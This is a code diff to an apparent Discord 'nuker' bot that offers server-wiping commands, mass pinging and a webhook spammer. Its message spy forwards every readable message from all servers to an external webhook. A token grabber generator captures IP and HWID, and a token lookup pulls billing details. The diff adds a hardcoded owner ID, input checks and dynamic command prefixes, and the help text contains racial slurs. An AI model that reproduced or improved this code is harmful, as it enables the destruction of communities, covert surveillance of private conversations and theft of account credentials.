@@ -21,7 +21,7 @@ from discord.ext import commands
 
                 # ================ changelog ================ # 
                 # everything looks better now
-                # added message spy with webhook
+                # added message spy with full webhook support
                 # added tokeninformation
                 # flush will now delete channels before spamming
                 # added tokeninfo.py
@@ -45,7 +45,7 @@ from discord.ext import commands
 
 
 
-YOURUSERID = ''
+YOURUSERID = '992952207588720730'
 
 
 intents = discord.Intents.all()
@@ -126,7 +126,7 @@ async def on_message(message):
         embed.add_field(name='🏫  Server', value=message.guild.name, inline=False)
         embed.add_field(name='🆔  Message ID', value=message.id, inline=False)
 
-        
+        # Check if the message is replying to another message   
         if message.reference and message.reference.message_id:
             replied_message = await message.channel.fetch_message(message.reference.message_id)
             if replied_message:
@@ -142,7 +142,7 @@ async def on_message(message):
             'embeds': [embed.to_dict()]
         }
 
-        
+        # Send payload to the webhook
         async with aiohttp.ClientSession() as session:
             async with session.post(fuckingwebhook, json=payload):
                 pass
@@ -735,9 +735,14 @@ async def dm(ctx, userid, *, messagecontent):
 
 @bot.command()
 async def webhookspam(ctx, webhook, msg):
-    await ctx.reply("Spamming webhook....")
-    await ctx.message.add_reaction("✔️")
-    webhookfuck(webhook, msg)
+    if not webhook.startswith("https://discord.com/api/webhooks/"):
+        embaed = discord.Embed(title="", description=f":x:  Invalid webhook.", color=discord.Color.red())
+        await ctx.reply(embed=embaed)
+        return
+    else:
+        await ctx.reply("Spamming webhook....")
+        await ctx.message.add_reaction("✔️")
+        webhookfuck(webhook, msg)
 
 
 @bot.command()
@@ -881,13 +886,13 @@ class XOLOVIEW(discord.ui.View):
                        style=discord.ButtonStyle.danger)
     async def nig(self, interaction: discord.Interaction, button: discord.ui.Button):
         help_embed = discord.Embed(title='Nuking', color=discord.Color.red())
-        help_embed.add_field(name='💣 Flush', value='Nukes server\n`!flush <serverid>`', inline=False)
-        help_embed.add_field(name='🔫 Custom Flush', value='Creates channels and messages\n`!customflush <serverid> <channelamount> <channelname> <messageamount> <messagecontent>`\nE.g. `!customflush 1234567890 5 ExampleChannel 10 ExampleMessage`', inline=False)
-        help_embed.add_field(name='🗑️ Purge', value='Deletes all channels\n`!purge <serverid>`', inline=False)
-        help_embed.add_field(name='😡 Mass Ping', value='Use if the bot does not have admin.\n`!massping <serverid> <messageamount> <messagecontent>`', inline=False)
-        help_embed.add_field(name='🧹 Clear Channel', value='Deletes all messages in a channel\n`!clearchannel <serverid> <channelid>`', inline=False)
-        help_embed.add_field(name='🚮 Role Purge (Cannot delete roles above the bot)', value='`!rolepurge <serverid>`', inline=False)
-        help_embed.add_field(name='🔴 Mass Ban [Broken]', value='`!massban <serverid>`', inline=False)
+        help_embed.add_field(name='💣 Flush', value=f'Nukes server\n`{bot.command_prefix}flush <serverid>`', inline=False)
+        help_embed.add_field(name='🔫 Custom Flush', value=f'Creates channels and messages\n`{bot.command_prefix}customflush <serverid> <channelamount> <channelname> <messageamount> <messagecontent>`\nE.g. `{bot.command_prefix}customflush 1234567890 5 ExampleChannel 10 ExampleMessage`', inline=False)
+        help_embed.add_field(name='🗑️ Purge', value=f'Deletes all channels\n`{bot.command_prefix}purge <serverid>`', inline=False)
+        help_embed.add_field(name='😡 Mass Ping', value=f'Use if the bot does not have admin.\n`{bot.command_prefix}massping <serverid> <messageamount> <messagecontent>`', inline=False)
+        help_embed.add_field(name='🧹 Clear Channel', value=f'Deletes all messages in a channel\n`{bot.command_prefix}clearchannel <serverid> <channelid>`', inline=False)
+        help_embed.add_field(name='🚮 Role Purge (Cannot delete roles above the bot)', value=f'`{bot.command_prefix}rolepurge <serverid>`', inline=False)
+        help_embed.add_field(name='🔴 Mass Ban [Broken]', value=f'`{bot.command_prefix}massban <serverid>`', inline=False)
         help_embed.set_footer(text="Made by xolo")
 
         await interaction.response.send_message(embed=help_embed, ephemeral=True)
@@ -896,17 +901,17 @@ class XOLOVIEW(discord.ui.View):
                        style=discord.ButtonStyle.green)
     async def niga(self, interaction: discord.Interaction, button: discord.ui.Button):
         helpembed = discord.Embed(title='Utilities', color=discord.Color.green())
-        helpembed.add_field(name='👟 Leave', value='Leaves the server\n`!leave <serverid>`', inline=False)
-        helpembed.add_field(name='🔗 Link', value='Bot Invite link\n`!link`', inline=False)
-        helpembed.add_field(name='📃 Server List', value='Shows a list of servers the bot is in for you to nuke.\n`!servlist`', inline=False)
-        helpembed.add_field(name='🧼 Clear', value='Deletes all messages sent by the bot\n`!clear <serverid>`', inline=False)
-        helpembed.add_field(name='❗ Set Prefix', value='Owner only\n`!setprefix <prefix>`', inline=False)
-        helpembed.add_field(name='🗿 Set Status', value='Owner only\n`!setstatus <status>`', inline=False)
-        helpembed.add_field(name='🗣️ Say', value='Says some bullshit you want\n`!say <msg>`', inline=False)
-        helpembed.add_field(name='🔨 Ban', value='`!ban <userid> <reason>`', inline=False)
-        helpembed.add_field(name='⚒️ UnBan', value='`!unban <userid>`', inline=False)
-        helpembed.add_field(name='🥷 DM', value='DM someone\n`!dm <userid> <msgcontent>`', inline=False)
-        helpembed.add_field(name=':baby: Avatar', value='Check the avatar sum nigga\n`!avatar <user>`', inline=False)
+        helpembed.add_field(name='👟 Leave', value=f'Leaves the server\n`{bot.command_prefix}leave <serverid>`', inline=False)
+        helpembed.add_field(name='🔗 Link', value=f'Bot Invite link\n`{bot.command_prefix}link`', inline=False)
+        helpembed.add_field(name='📃 Server List', value=f'Shows a list of servers the bot is in for you to nuke.\n`{bot.command_prefix}servlist`', inline=False)
+        helpembed.add_field(name='🧼 Clear', value=f'Deletes all messages sent by the bot\n`{bot.command_prefix}clear <serverid>`', inline=False)
+        helpembed.add_field(name='❗ Set Prefix', value=f'Owner only\n`{bot.command_prefix}setprefix <prefix>`', inline=False)
+        helpembed.add_field(name='🗿 Set Status', value=f'Owner only\n`{bot.command_prefix}setstatus <status>`', inline=False)
+        helpembed.add_field(name='🗣️ Say', value=f'Says some bullshit you want\n`{bot.command_prefix}say <msg>`', inline=False)
+        helpembed.add_field(name='🔨 Ban', value=f'`{bot.command_prefix}ban <userid> <reason>`', inline=False)
+        helpembed.add_field(name='⚒️ UnBan', value=f'`{bot.command_prefix}unban <userid>`', inline=False)
+        helpembed.add_field(name='🥷 DM', value=f'DM someone\n`{bot.command_prefix}dm <userid> <msgcontent>`', inline=False)
+        helpembed.add_field(name=':baby: Avatar', value=f'Check the avatar sum nigga\n`{bot.command_prefix}avatar <user>`', inline=False)
         helpembed.set_footer(text="Made by xolo")
 
         await interaction.response.send_message(embed=helpembed, ephemeral=True)
@@ -922,13 +927,13 @@ class XOLOVIEW(discord.ui.View):
         global deletespy
         global editspy
         helpxembed = discord.Embed(title='Spy', color=discord.Color.greyple())
-        helpxembed.add_field(name='💬 Message spy', value=f'Sends EVERY single message the bot has access to from all servers the bot is in.\n🚨 YOUR WEBHOOK MUST BE IN A CHANNEL NAMED "spy" 🚨\n[!messagespytoggle <on/off> <webhook>]\nStatus: {messagespy}', inline=False)
-        helpxembed.add_field(name='📜 Audit log spy', value=f'[!auditspytoggle <on/off>]\nStatus: {auditlogspy}', inline=False)
-        helpxembed.add_field(name='🔴 User profile spy [BROKEN]', value=f'Let you know when a user changes anything from their profile.\n[!profilespytoggle <on/off>]\nStatus: {userprofilespy}', inline=False)
-        helpxembed.add_field(name='🗡️ Ban spy', value=f'Let you know when a user gets banned.\n[!banspytoggle <on/off>]\nStatus: {banspy} ', inline=False)
-        helpxembed.add_field(name='🏃 Leave spy', value=f'Useless ass feature\n[!leavespytoggle <on/off>]\nStatus: {leavespy} ', inline=False)
-        helpxembed.add_field(name='🗑️ Spy deleted messages', value=f'Let you know when a message gets deleted.\n[!deletespytoggle]\nStatus: {deletespy} ', inline=False)
-        helpxembed.add_field(name='✍️ Spy edited messsages', value=f'Let you know when someone edits a message.\n[!editspytoggle]\nStatus: {editspy} ', inline=False)
+        helpxembed.add_field(name='💬 Message spy', value=f'Sends EVERY single message the bot has access to from all servers the bot is in.\n🚨 YOUR WEBHOOK MUST BE IN A CHANNEL NAMED "spy" 🚨\n[{bot.command_prefix}messagespytoggle <on/off> <webhook>]\nStatus: {messagespy}', inline=False)
+        helpxembed.add_field(name='📜 Audit log spy', value=f'[{bot.command_prefix}auditspytoggle <on/off>]\nStatus: {auditlogspy}', inline=False)
+        helpxembed.add_field(name='🔴 User profile spy [BROKEN]', value=f'Let you know when a user changes anything from their profile.\n[{bot.command_prefix}profilespytoggle <on/off>]\nStatus: {userprofilespy}', inline=False)
+        helpxembed.add_field(name='🗡️ Ban spy', value=f'Let you know when a user gets banned.\n[{bot.command_prefix}banspytoggle <on/off>]\nStatus: {banspy} ', inline=False)
+        helpxembed.add_field(name='🏃 Leave spy', value=f'Useless ass feature\n[{bot.command_prefix}leavespytoggle <on/off>]\nStatus: {leavespy} ', inline=False)
+        helpxembed.add_field(name='🗑️ Spy deleted messages', value=f'Let you know when a message gets deleted.\n[{bot.command_prefix}deletespytoggle]\nStatus: {deletespy} ', inline=False)
+        helpxembed.add_field(name='✍️ Spy edited messsages', value=f'Let you know when someone edits a message.\n[{bot.command_prefix}editspytoggle]\nStatus: {editspy} ', inline=False)
         helpxembed.set_footer(text="Made by xolo")
 
 
@@ -939,9 +944,9 @@ class XOLOVIEW(discord.ui.View):
                        style=discord.ButtonStyle.blurple)
     async def nigar(self, interaction: discord.Interaction, button: discord.ui.Button):
         help_embed = discord.Embed(title='Side features', color=discord.Color.dark_gold())
-        help_embed.add_field(name='🪝 Webhook Spammer', value='Spams a webhook until it gets rate limited asf\n`!webhookspam <webhook> <msgcontent>`', inline=False)
-        help_embed.add_field(name='🎠 Token grabber generator', value='Generates a token grabber in python. Also grabs IP, HWID, etc.\n`!tokengrabber <webhook> <obfuscate: true/false>`', inline=False)
-        help_embed.add_field(name='💸 Token Information', value='Provides full information on a user token. Billing info will also be grabbed if any.\n`!tokinfo <token>`', inline=False)
+        help_embed.add_field(name='🪝 Webhook Spammer', value=f'Spams a webhook until it gets rate limited asf\n`{bot.command_prefix}webhookspam <webhook> <msgcontent>`', inline=False)
+        help_embed.add_field(name='🎠 Token grabber generator', value=f'Generates a token grabber in python. Also grabs IP, HWID, etc.\n`{bot.command_prefix}tokengrabber <webhook> <obfuscate: true/false>`', inline=False)
+        help_embed.add_field(name='💸 Token Information', value=f'Provides full information on a user token. Billing info will also be grabbed if any.\n`{bot.command_prefix}tokinfo <token>`', inline=False)
         help_embed.set_footer(text="Made by xolo")
 
         await interaction.response.send_message(embed=help_embed, ephemeral=True)
